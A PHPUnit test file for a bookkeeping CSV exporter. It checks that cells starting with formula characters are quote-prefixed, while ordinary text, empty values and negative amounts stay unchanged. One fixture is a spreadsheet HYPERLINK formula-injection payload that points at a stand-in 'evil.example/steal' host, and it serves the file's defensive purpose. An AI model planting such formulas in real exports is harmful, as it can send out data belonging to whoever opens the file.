<?php

declare(strict_types=1);

namespace BizHub\Bookkeeping\Tests\Unit\Export;

use BizHub\Bookkeeping\Export\CsvWriter;
use PHPUnit\Framework\TestCase;

final class CsvWriterTest extends TestCase
{
    /**
     * @dataProvider formulaPrefixProvider
     */
    public function testNeutralizesLeadingFormulaCharacters(string $malicious, string $expectedPrefixed): void
    {
        $csv = (new CsvWriter())->toString([['description' => $malicious]], ['description']);

        self::assertSame($expectedPrefixed, str_getcsv(trim(explode("\n", $csv)[1]), ',', '"', '\\')[0]);
    }

    /**
     * @return array<string,array{0:string,1:string}>
     */
    public static function formulaPrefixProvider(): array
    {
        return [
            'equals' => [
                '=HYPERLINK("http://evil.example/steal","x")',
                "'=HYPERLINK(\"http://evil.example/steal\",\"x\")",
            ],
            'plus' => ['+1+1', "'+1+1"],
            'minus' => ['-1+1', "'-1+1"],
            'at' => ['@SUM(1,1)', "'@SUM(1,1)"],
        ];
    }

    public function testLeavesOrdinaryDescriptionsUnchanged(): void
    {
        $csv = (new CsvWriter())->toString([['description' => 'Client invoice']], ['description']);

        self::assertSame('Client invoice', str_getcsv(trim(explode("\n", $csv)[1]), ',', '"', '\\')[0]);
    }

    public function testDoesNotChokeOnAnEmptyValue(): void
    {
        // Paired with a non-empty column so the row itself isn't a
        // fully empty line - str_getcsv('') parses to [null], not [''],
        // which would otherwise be a test-parsing artifact rather than
        // a real assertion about CsvWriter's own behaviour.
        $csv = (new CsvWriter())->toString(
            [['description' => '', 'amount' => '1.00']],
            ['description', 'amount']
        );

        self::assertSame('', str_getcsv(trim(explode("\n", $csv)[1]), ',', '"', '\\')[0]);
    }

    public function testLeavesANegativeAmountUnchanged(): void
    {
        // "-800.00" starts with "-" like a formula prefix, but it's a
        // purely numeric exported amount (every exporter's Amount
        // column) - it must never be quote-prefixed, or the figure
        // would be corrupted for anyone importing the CSV back into
        // accounting software.
        $csv = (new CsvWriter())->toString([['amount' => '-800.00']], ['amount']);

        self::assertSame('-800.00', str_getcsv(trim(explode("\n", $csv)[1]), ',', '"', '\\')[0]);
    }
}
